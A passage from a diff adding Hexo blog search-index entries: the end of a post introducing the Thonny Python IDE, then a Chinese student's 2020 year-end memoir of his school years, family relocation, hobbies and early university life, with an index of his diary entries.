6、突出语法错误</p><p>　　未关闭的引号和括号是最常见的初学者语法错误。Thonny的编辑器可以让你很容易发现这些错误。</p><p>　　7、解释了作用域</p><p>　　高亮显示变量的出现，可以提醒你相同的名称并不总是意味着相同的变量，并且有助于发现错别字。本地变量与全局变量有了直观的区分。</p><p>　　8、解释引用的模式</p><p>　　变量表最初按照简化模式（名称→值）呈现，但可以切换到更现实的模式（名称→地址/ID→值）。</p><p>　　变量表与值表</p><p>　　9、代码完成</p><p>　　学生可以通过代码完成的帮助，探索API。</p><p>　　10、初学者友好的系统shell</p><p>　　选择 “工具”→打开系统shell来安装额外的软件包或学习在命令行上处理Python。PATH和与其他Python解释器的冲突由Thonny处理。</p><p>　　11、简单、干净的pip GUI</p><p>　　选择工具 → 管理软件包，更容易安装第三方软件包。</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><div class="note warning"><p>本文章发布时官网最新版本为3.3.6</p></div><span class='btn center large'><a class="button" href='https://thonny.org/' title='官网下载'><i class='fas fa-download'></i>官网下载</a></span><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> 软件 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 原创 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>2020年年终总结</title>
+      <link href="/2021/02/10/blogs/summary2020/"/>
+      <url>/2021/02/10/blogs/summary2020/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span class='p center logo large'>心理疾病诊断书</span><span class='p center small'>心灵疗养院</span><span id="more"></span><span class='p red'>姓名</span>     ： <psw>Aoian</psw><span class='p yellow'>性别</span>  ：<psw>难</psw><span class='p cyan'>年龄</span>    ：<psw>三分之甲子</psw><span class='p blue'>别名</span>    ：<psw>新年的礼物</psw><blockquote><p>诊断背景①：2020年这是不平凡的一年(；´д｀)ゞ，在疫情中洗礼，经烈火而永生，无数家庭遭遇了苦难，体验了离合悲欢，愿远在天堂的人们一路走好︿(￣︶￣)︿。</p><p>诊断背景②：2021年，这又是不平凡的年头，说好的一月20日学校放假，却因河北疫情而导致他（我的好朋友）不得不提前回家，借此闲暇，他进入 <emp>心灵疗养院</emp> 找我看看病，岂不快哉٩(๑&gt;◡&lt;๑)۶ ！文章将会永久保存</p></blockquote><div class="note info"><p>以下为他的叙述：（让我们一起走进他的世界）</p></div><p>物欲横飞的世界，究竟怎样，才能永葆初心？</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://s3.ax1x.com/2021/02/11/yBo60S.jpg" class="lazyload placeholder" data-srcset="https://s3.ax1x.com/2021/02/11/yBo60S.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="小小的脑袋,大大的疑惑"/></div><span class="image-caption">小小的脑袋,大大的疑惑</span></div><h2 id="1-回顾三分之甲子"><a href="#1-回顾三分之甲子" class="headerlink" title="1 回顾三分之甲子"></a>1 回顾三分之甲子</h2><p>20岁，算60年的三分之一了。他问自己一句：“你是成年人了吗？”</p><p>————从法律意义上来讲，<psw>是的</psw>。</p><p>————在他自己眼里，<psw>不是</psw>。</p><p>————在家人眼里，<psw>远远不是</psw>。</p><p>这20年，在学校的时光，占据了大部分，剩下的，才是和家人的。</p><p>总述：繁花似锦之中，淡云流水慌度。</p><p>没有这篇总结，他觉得对不起他这20年。</p><h3 id="1-1-一眨眼小学就过去了"><a href="#1-1-一眨眼小学就过去了" class="headerlink" title="1.1 一眨眼小学就过去了"></a><em>1.1 一眨眼小学就过去了</em></h3><h4 id="1-1-1-幼儿班"><a href="#1-1-1-幼儿班" class="headerlink" title="1.1.1 幼儿班"></a>1.1.1 幼儿班</h4><p>出生是什么时候？他忘记了，只是隐约记得身份证上写的，那就按这个算吧。没上过什么大班小班中班，至今也未曾弄懂，就不提了吧。幼儿班的老师是谁，他也忘记了，毕竟，过了这么多年，不记得也情有可原吧，妈妈说他总是哭，第一次送他去幼儿班，他就哭着不乐意，没办法，就第二年去的幼儿班，在<em>东新房小学</em>。</p><p>想起了那首诗<em>最喜小儿亡赖，</em>溪头卧剥莲蓬。家乡没有莲蓬，但是他那时候却一点也不乏味。幼儿班好玩的很，当时的他们没有上下课铃，老师站在门口，说什么时候上课就是什么时候上课，早早地写完作业，然后直接下课，到外面去抓蜗牛，哈哈，蜗牛很多，个头很大。</p><h4 id="1-1-2-一、二年级"><a href="#1-1-2-一、二年级" class="headerlink" title="1.1.2 一、二年级"></a>1.1.2 一、二年级</h4><p>孩童的时代，总是快乐的，不是吗？他也是在<em>东新房小学</em>上的，任教的是<code>陈焕新</code>老师（全科老师），当时只有两个老师，教三个年级，就是三个班，两个班在一个屋子里，一个老师，一会儿去左边教，一会儿去右边教，忙的不亦乐乎。</p><p>当时他好像还是个班长，当班长的感觉还行吧，但是他忘了他是怎么当上的，稀里糊涂的(￣.￣)…..</p><p>快到中午时，老师总是说“谁先抄完黑板上的拼音与汉字，谁就出去吃饭吧”，然后他们奋笔疾书，之后跑去吃饭，好像那个时候他基本是第一个写完，然后第一个买上午饭，一个馒头，一袋辣条。</p><p>当时他学习也挺好的。开始得奖状了…… <psw>（ 话说小学时候还“偷过”棒子呢，掉过井。。。啊这。。。)</psw></p><h4 id="1-1-3-三年级至六年级"><a href="#1-1-3-三年级至六年级" class="headerlink" title="1.1.3 三年级至六年级"></a>1.1.3 三年级至六年级</h4><p>三年级就到<em>两间房寄宿制完全小学</em>上学了，离家比较远了，需要住宿了，一周去回一次，接触了“专车”接送，他才知道，这是一种暴利，不仅不安全，还多花钱，超员现象严重。以前是这样，现在不知道现在是什么样子了。</p><p>老师都很好，但个别的存在管教失度等问题，具体自己体会吧，孩子年龄还小，哪里知道维权呢?记得家长最喜欢的一句话就是:”老师，孩子他交给您了，你随便管吧！”真的是随便管了， <psw>当时科学课有个半米长的竹棍不知道打在了谁身上</psw> ……</p><p>他当时脾气也不好。</p><p>三四五年级都在三班，六年级分班级，在二班。</p><p>六年级有点压力，他们也有手机的陪伴。不过，还好，可以”藏在文书中”（将书挖出一个槽，把手机放在里面）: 不是么？</p><p>记得“五三”，好像怎么也忘不掉,李老师惩罚我们班全校最后一个吃饭…</p><p>参加了一个六一儿童节，当时表演的是三句半。</p><p>晴芳独韵日记开始谱写。</p><p>微博开始，第一次发的<a href="https://weibo.com/u/5533854068">微博</a>。</p><details blue><summary> 点击查看 </summary>              <div class='content'>              <div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2015-8-weibo-tiaoshui.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2015-8-weibo-tiaoshui.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="家里距离水井很远，要这样运送水" style="width:600px;"/></div><span class="image-caption">家里距离水井很远，要这样运送水</span></div>              </div>            </details><p>2008年参加了一次活动去了北京，那是他第一次出远门。</p><p>三年学习成绩挺好的，第四年差点事。本来是应该诚信应考，但是小考之前的一天，老师要求那些学习差的，能抄多少尽量多抄。他觉得可能老师也可能是为了同学们的将来着想吧。</p><p>家里经济很紧，他很穷吗？不，他不穷，他把一张大票放在口袋里，一放就是一星期，初中就是一个月，他不穷，他只是不花，这是他的尊严。</p><p>六年级好辛苦，早早地就要起床，在小操场上背《科学》。</p><p>收获了好多小伙伴，现在也不知道怎么样了？过得还好吗?</p><h3 id="1-2-还没准备的初中"><a href="#1-2-还没准备的初中" class="headerlink" title="1.2 还没准备的初中"></a><em>1.2 还没准备的初中</em></h3><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/liuzhongmen_20180831.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/liuzhongmen_20180831.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="六中的门口" style="width:600px;"/></div><span class="image-caption">六中的门口</span></div><p>还没准备什么，就走进了<em>滦平六中</em>。这使他知道，小学时候，是他最快乐的日子，没有之一。</p><p>一直在八班。真是服了，担当区不是垃圾站就是厕所。。。</p><p>这里，好像到处充斥着暴力，无论校内还是校外。“看门人”，“快递员”，“打工人”，“保姆”……不知道他还有什么职业是没体验过的。</p><psw>尔虞他诈，“官僚“剥削，托人办事?</psw><p>他最不喜欢迎合，不用迎合他，也不要花心思在身上，和他耍心眼子，没用。</p><p>他不相信他不会为自己的行为付出代价。学校无能，教师无力，但是他相信社会不是那个样子，他也相信国家会严厉打击。这么多年过去了，原谅他还记得，纵使他多次尝试忘记。冤冤相报何时了，就让青春随着风飘散吧…</p><p>初一第一次考试，年级第一，之后就。。。。。。不想上了，想退学了。</p><p>后来因为坚持要学计算机，这是他的理想，不愿意放弃！</p><p>开办了网站，历经几次更改，现在叫做<a href="https://blog.aoian.cn/">小高技术栈</a>。</p><p>小高全家桶网址：</p> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">https://aoian.cn</span><br></pre></td></tr></table></figure><div class="tag link"><a class="link-card" title="小高全家桶" href="https://aoian.cn/"><div class="left"><img src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets@master/logo/256/safari.png" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg"/></div><div class="right"><p class="text">小高全家桶</p><p class="url">https://aoian.cn/</p></div></a></div><p>啥也不想说了，初中没什么好的。有一次竟然在雪地上做俯卧撑，他也是醉了。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2015-2-tuzi.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2015-2-tuzi.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="家里养的小兔子" style="width:600px;"/></div><span class="image-caption">家里养的小兔子</span></div><p>在家里养了兔子，到了高中就全部送人了。</p><p>没怎么结交朋友，“金哥”就是一个。</p><p>又养了鸽子，最后我给放飞了，鸽子属于蓝天。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2015-7-gezi2.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2015-7-gezi2.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="曾经捕捉的受伤的鸽子" style="width:600px;"/></div><span class="image-caption">曾经捕捉的受伤的鸽子</span></div><p>还见到了刺猬，最后也放走了。</p><details blue><summary> 点击查看 </summary>              <div class='content'>              <div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/ciwei_20170701.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/ciwei_20170701.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="偶然在家门口遇见的刺猬" style="width:600px;"/></div><span class="image-caption">偶然在家门口遇见的刺猬</span></div>              </div>            </details><p>那俩同桌倒是记得挺清楚，当时还给他二同桌（ <psw>李可心</psw> ）:写了一封离别信。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/liuzhong.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/liuzhong.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="六中" style="width:600px;"/></div><span class="image-caption">六中</span></div><p>话说他刚想起来，一个初中，室外担当区不是厕所就是垃圾堆，真无语。。。</p><p>那个厕所的过道，冬天下完雪就可以滑下来了，他说他还摔过一回呢，确实太滑了</p><h3 id="1-3-高中太匆匆"><a href="#1-3-高中太匆匆" class="headerlink" title="1.3 高中太匆匆"></a><em>1.3 高中太匆匆</em></h3><p>高中没有太多伤心，没有过多的快乐，亦没有过多的过往，有的，只有那数不清的卷子和老师滔滔不绝的授课。</p><p>高一时候姥姥家开始换上彩钢。上大学时候，姥姥家就拆了。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2016-6-laolaojia.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2016-6-laolaojia.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="装修的姥姥家" style="width:600px;"/></div><span class="image-caption">装修的姥姥家</span></div><p>2020年年底，姥姥家也享受扶贫搬迁政策，家里的老房子拆了。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://s3.ax1x.com/2021/02/11/yBHRte.jpg" class="lazyload placeholder" data-srcset="https://s3.ax1x.com/2021/02/11/yBHRte.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="搬迁走后，老家就拆了" style="width:600px;"/></div><span class="image-caption">搬迁走后，老家就拆了</span></div><p>不过很好了，若初中时黑暗，高中也许是黎明。</p><p>一直在13班。</p><p>1）老师的经典语录，在此。</p><p>​    “这道题讲了多少遍了？我教了一遍，又让别人上黑板做了一遍，你怎么还不会？!”</p><p>​    ———— <psw>他怎么知道他竟然不会?</psw></p><p>​    “你怎么这么笨？傻子早都会做了，你咋还不会？”</p><p>​    ———— <psw>还好，他不是傻子。</psw></p><p>​    “其他老师留的作业你自己想办法，反正他留的作业必须完成。”</p><p>​    ———— <psw>您行您有理，他斗不过。</psw></p><p>​    “马上来找我”</p><p>​    ———— <psw>好家伙，发生什么事了？</psw></p><p>2）认识一大堆同学</p><p>有自己班的：全体同学（包括分科前后）</p><p>有兄弟班的：大部分同学</p><p>还有别的班的（不算与自己在过一个班的）：极少数吧，想不起来了</p><p>3)想吐槽</p><p>起床时很早，天黑还得跑</p><p>4)家庭情况大转变</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://s3.ax1x.com/2021/02/11/yB75ZT.jpg" class="lazyload placeholder" data-srcset="https://s3.ax1x.com/2021/02/11/yB75ZT.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="我的老家" style="width:600px;"/></div><span class="image-caption">我的老家</span></div><p>响应国家异地扶贫搬迁政策（因为家乡太缺水了，井有的时候会干），搬家到了滦平县城。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-7-well.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-7-well.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="井有水的时候" style="width:600px;"/></div><span class="image-caption">井有水的时候</span></div><p>感谢政府，让他家家庭生活变好了。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2017-4-cunzi.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2017-4-cunzi.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="远拍村庄" style="width:600px;"/></div><span class="image-caption">远拍村庄</span></div><h3 id="1-4-假期乐哈哈"><a href="#1-4-假期乐哈哈" class="headerlink" title="1.4 假期乐哈哈"></a>1.4 假期乐哈哈</h3><p>真棒！他和宿舍好友一起去了光哥家（金沟屯），一起烧烤。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-7-jingoutun.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-7-jingoutun.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="金沟屯的水田" style="width:600px;"/></div><span class="image-caption">金沟屯的水田</span></div><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/shaokao_20200711.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/shaokao_20200711.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="瞧，老毕正在烧烤" style="width:600px;"/></div><span class="image-caption">瞧，老毕正在烧烤</span></div><p>还去了大舅妈家，白洋淀的荷花好大啊！下图为看地笼。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-8-baiyangdian.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-8-baiyangdian.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="查看地笼捕捉鱼虾" style="width:600px;"/></div><span class="image-caption">查看地笼捕捉鱼虾</span></div><h2 id="2-观大学生活全方面-大一上学期"><a href="#2-观大学生活全方面-大一上学期" class="headerlink" title="2 观大学生活全方面(大一上学期)"></a>2 观大学生活全方面(大一上学期)</h2><p>上大学喽</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-9huoche.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-9huoche.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="坐火车" style="width:600px;"/></div><span class="image-caption">坐火车</span></div><h3 id="2-1-学"><a href="#2-1-学" class="headerlink" title="2.1 学"></a>2.1 学</h3><p>课内：</p><p>一周课“不少”，活动还加料，新东方必听，推销真是恼。</p><p>学习通，智慧树，完美校园和易班，这个群那个群，入学以来群增百。</p><p>课外：</p><p>加入两个部门，感觉并不是很好，还是他太年轻。</p><p>读了一点儿《安妮日记》</p><p>学习了一点网络安全课程在看雪论坛上，也学习了一点单片机原理，这是上海交通大学的智慧树在线课程，看了一半，做了笔记。同时呢，还搞搞路由器。</p><h3 id="2-2-衣"><a href="#2-2-衣" class="headerlink" title="2.2 衣"></a>2.2 衣</h3><p>最美的穿搭，都在这里，比高中更加多样，当然，比高中更加丰富。</p><h3 id="2-3-食"><a href="#2-3-食" class="headerlink" title="2.3 食"></a>2.3 食</h3><p>唉，不提吃的行不行。三个食堂，远近不一，虽说不咋好吃吧，还是非常贵，不如外卖。</p><p>有次班级团建和组织部门团建，全是 <span class='p red'>辣</span> 的菜，<psw>他哭了</psw> 。。。</p><h3 id="2-4-住"><a href="#2-4-住" class="headerlink" title="2.4 住"></a>2.4 住</h3><p>还可以，很满意，就是太潮湿了。下雨是常态，太阳躲得快。</p><h3 id="2-5-行"><a href="#2-5-行" class="headerlink" title="2.5 行"></a>2.5 行</h3><p>学校没有一个正经的围墙，走着走着就出去了，“这是跟他在开玩笑？”</p><p>去过神农湖，看过神农塔。</p><h3 id="2-6-玩"><a href="#2-6-玩" class="headerlink" title="2.6 玩"></a>2.6 玩</h3><p>看了17.3关于性</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2021-1-173.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2021-1-173.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="17.3剧" style="width:600px;"/></div><span class="image-caption">17.3剧</span></div><p>去了神农湖，绕了神农塔，喝了奶茶。</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-1-hu.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-1-hu.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="神农湖划船" style="width:600px;"/></div><span class="image-caption">神农湖划船</span></div><p>游览了博物馆</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-11-bowuguan.jpg" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/2926295173/cdn-picture/2020-11-bowuguan.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="株洲博物馆游览" style="width:600px;"/></div><span class="image-caption">株洲博物馆游览</span></div><h2 id="3-让《晴芳独韵》撑起半边天"><a href="#3-让《晴芳独韵》撑起半边天" class="headerlink" title="3 让《晴芳独韵》撑起半边天"></a>3 让《晴芳独韵》撑起半边天</h2><p>他说这里是他的心声，是他成长的见证</p><p>也许有一天，你忘记了自己做过的事情，但它可能会被记在这里</p><div class="img-wrap"><div class="img-bg"><img class="img lazyload placeholder" src="https://s3.ax1x.com/2021/02/11/yBHUkF.jpg" class="lazyload placeholder" data-srcset="https://s3.ax1x.com/2021/02/11/yBHUkF.jpg" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" alt="小猫咪能有什么坏心眼呢" style="width:600px;"/></div><span class="image-caption">小猫咪能有什么坏心眼呢</span></div><p>他说他希望别人读懂他的日记，去了解他，巧了，我就是他最好的朋友</p><p>他是一个想不透的人，弄透了他，或许懂了人生。。。</p><p>从 小学开始吧</p><div class="note info"><p>手机用户可能显示不全，试试左右滑动</p></div><table><thead><tr><th align="center">编号</th><th align="center">标题</th><th align="center">简介</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">刻字</td><td align="center">对“纹身”的理解</td></tr><tr><td align="center">1</td><td align="center">作者自介</td><td align="center">介绍自己</td></tr><tr><td align="center">2</td><td align="center">梦初醒</td><td align="center">介绍家庭</td></tr><tr><td align="center">3</td><td align="center">到现在</td><td align="center">介绍小学的事情</td></tr><tr><td align="center">4</td><td align="center">人生转变（周）</td><td align="center">做白日梦</td></tr><tr><td align="center">5</td><td align="center">我不明白</td><td align="center"><psw>晚自习下课了之后的事情</psw></td></tr><tr><td align="center">6</td><td align="center">纯真哪去了？</td><td align="center"><psw>自己批判自己胆小</psw></td></tr><tr><td align="center">7</td><td align="center">杂话论谈</td><td align="center">关于学习与层次</td></tr><tr><td align="center">8</td><td align="center">哲理录选文</td><td align="center">关于自己认为的哲理</td></tr><tr><td align="center">9</td><td align="center">谈——交往</td><td align="center"><psw>谈“搞对象”</psw></td></tr><tr><td align="center">10</td><td align="center">女生们的困惑</td><td align="center"><psw>解答异性困惑</psw></td></tr><tr><td align="center">11</td><td align="center">致——情窦初开的年纪</td><td align="center"><psw>谈谈感情</psw></td></tr><tr><td align="center">12</td><td align="center">初生的“太阳”</td><td align="center">对老师的敬仰</td></tr><tr><td align="center">13</td><td align="center">我信奉的福祸平衡说</td><td align="center">对快乐的期待</td></tr><tr><td align="center">14</td><td align="center">勿忘吾耻</td><td align="center">对某人的憎恶</td></tr><tr><td align="center">15</td><td align="center">九年级starting</td><td align="center">快乐的九年级</td></tr><tr><td align="center">16</td><td align="center">同桌</td><td align="center"><psw>可能是好感</psw></td></tr><tr><td align="center">17</td><td align="center">社会</td><td align="center">对校外买水以及村里选干部的感想</td></tr><tr><td align="center">18</td><td align="center">观“二战”之风云</td><td align="center"><psw>校内打架</psw></td></tr><tr><td align="center">19</td><td align="center">谈“思想”</td><td align="center">思想的重要性</td></tr><tr><td align="center">20</td><td align="center">面临的问题</td><td align="center">日记的问题叙述</td></tr><tr><td align="center">21</td><td align="center">怪我不能平等地对待朋友</td><td align="center"><psw>对性别的思考</psw></td></tr><tr><td align="center">22</td><td align="center">本周纪实</td><td align="center">快中考了</td></tr><tr><td align="center">23</td><td align="center">“喜欢”的故事</td><td align="center">问问朋友的故事</td></tr><tr><td align="center">24</td><td align="center">周周记</td><td align="center">班级聚会，我伤心了</td></tr><tr><td align="center">25</td><td align="center">中考</td><td align="center">有人受伤了</td></tr><tr><td align="center">26</td><td align="center">“羞”，亦或胆小</td><td align="center">打招呼？吃饭？</td></tr><tr><td align="center">27</td><td align="center">生日</td><td align="center">我的生日</td></tr><tr><td align="center">28</td><td align="center">理性与人性</td><td align="center">对自然的理解</td></tr><tr><td align="center">29</td><td align="center">看她“不顺眼”</td><td align="center">记录读书管理</td></tr><tr><td align="center">30</td><td align="center">别怪我无情</td><td align="center">不想管读书了</td></tr><tr><td align="center">31</td><td align="center">时评热点（之汇英中学）</td><td align="center">对热点的评析</td></tr><tr><td align="center">32</td><td align="center">习惯成“应该”</td><td align="center">对让座的理解</td></tr><tr><td align="center">33</td><td align="center">承担，为自己的行为负责</td><td align="center">说话被罚了</td></tr><tr><td align="center">34</td><td align="center">路虽迩，亦无悔</td><td align="center">对悲惨的世界的理解</td></tr><tr><td align="center">35</td><td align="center">回味影视之乐</td><td align="center">谈谈电视剧吧</td></tr><tr><td align="center">36</td><td align="center">由《香蜜》引发的联想</td><td align="center">香蜜沉沉烬如霜</td></tr><tr><td align="center">37</td><td align="center">会考的联想</td><td align="center">会考（好像没关系）</td></tr><tr><td align="center">38</td><td align="center">回味来时之路</td><td align="center">回味自己</td></tr><tr><td align="center">39</td><td align="center">仇恨亦是种力量</td><td align="center">对仇恨的理解</td></tr><tr><td align="center">40</td><td align="center">己不律，何以评人</td><td align="center">跟风</td></tr><tr><td align="center">41</td><td align="center">“第二”比“第一”差了多少</td><td align="center">被同学的家长认出来了</td></tr><tr><td align="center">42</td><td align="center">愿历尽千帆，归来仍少年</td><td align="center">高三很迷茫</td></tr><tr><td align="center">43</td><td align="center">十四班交际史</td><td align="center">交友</td></tr><tr><td align="center">44</td><td align="center">随笔录</td><td align="center">小欢喜</td></tr><tr><td align="center">45</td><td align="center">周周记</td><td align="center">新年的假期</td></tr><tr><td align="center">46</td><td align="center">以理想之火点燃希望之路</td><td align="center">回忆录</td></tr><tr><td align="center">47</td><td align="center">为何我如此尴尬</td><td align="center">真巧，真不巧</td></tr><tr><td align="center">48</td><td align="center">重走南山公园</td><td align="center">游玩</td></tr><tr><td align="center">49</td><td align="center">Happy Day</td><td align="center">喜欢</td></tr><tr><td align="center">50</td><td align="center">家，你终于来了</td><td align="center">家庭对成长的影响</td></tr><tr><td align="center">60</td><td align="center">与你的第二次出行</td><td align="center"><psw>爬山?</psw></td></tr><tr><td align="center">61</td><td align="center"><psw>“这”，算表白吗？</psw></td><td align="center"><psw>QQ聊天记录</psw></td></tr><tr><td align="center">62</td><td align="center">不好意思，惹你生气</td><td align="center">愧疚</td></tr><tr><td align="center">63</td><td align="center">进入大学</td><td align="center">大学</td></tr><tr><td align="center">64</td><td align="center">大学生活纪实</td><td align="center">大学</td></tr><tr><td align="center">65</td><td align="center">加入2个部门</td><td align="center">进步与期待</td></tr><tr><td align="center">66</td><td align="center">辩论赛</td><td align="center">比赛</td></tr><tr><td align="center">67</td><td align="center">关于学委我想说的话</td><td align="center"><psw>我们班的学委太辛苦了</psw></td></tr><tr><td align="center">68</td><td align="center">提前回家</td><td align="center">从大学回家啦</td></tr></tbody></table><h2 id="期待未来会更好"><a href="#期待未来会更好" class="headerlink" title="期待未来会更好"></a>期待未来会更好</h2><details yellow><summary> 人，要怎样度过这一生？ 点击查看更多 </summary>              <div class='content'>              <p>他想过放弃，也许，不是所有人都能飞上蓝天，<br>他想过调走，也许，他本来就不属于这里，<br>他想过停下，这是一条看不到尽头的路。</p><div class="note warning"><p>忠于自他未必有果，坚持努力也不一定换来成功，</p></div><div class="note bug red"><p>但有天他们回望过往，是胸怀壮阔还是满心懊悔，取决于他们每个当下。</p></div>              </div>            </details><p>过去已经回不去了，只能向前走吧。</p><p>即使没有月亮，心中也是一片皎洁。</p><p>追求使自己快乐的东西，不是很好么？</p><p>学土木就学土木吧，兴趣是网络安全，他会继续探索的。给他加油吧！</p><p> 